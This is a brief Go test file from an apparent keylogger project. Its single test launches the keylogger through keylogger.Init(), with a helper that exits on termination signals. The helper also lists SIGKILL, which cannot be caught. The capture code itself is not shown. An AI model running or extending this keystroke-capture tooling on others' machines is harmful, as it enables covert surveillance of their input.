package keylog_test

import (
	"os"
	"os/signal"
	"syscall"
	"testing"

	"github.com/Tom5521/keylogger/internal/keylogger"
)

func TestLogger(t *testing.T) {
	go catcher()
	keylogger.Init()
}

func catcher() {
	terminate := make(chan os.Signal, 1)
	signal.Notify(terminate, syscall.SIGINT, syscall.SIGTERM, syscall.SIGKILL)
	for range terminate {
		os.Exit(0)
	}
}
